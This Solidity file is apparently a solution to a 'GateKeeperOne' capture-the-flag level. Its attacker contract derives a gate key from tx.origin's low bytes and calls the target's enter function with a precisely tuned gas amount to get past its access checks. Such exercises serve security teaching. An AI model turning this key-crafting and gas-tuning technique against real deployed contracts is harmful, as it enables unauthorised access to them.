// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGateKeeperOne {
  function enter(bytes8 _gateKey) external;
}

contract GateKeeperOneAttacker {
  IGateKeeperOne gk1;

  event Log(string msg, uint256 amount);

  constructor(address _address) {
    gk1 = IGateKeeperOne(_address);
  }

  function attack() public {
    uint16 lastTwoBytes = uint16(uint160(tx.origin));
    uint64 upperFourBytes = 0xcafebabe00000000;
    bytes8 gateKey = bytes8(upperFourBytes + lastTwoBytes);
    gk1.enter{gas: 819100 + 248 + 6}(gateKey);
  }

}
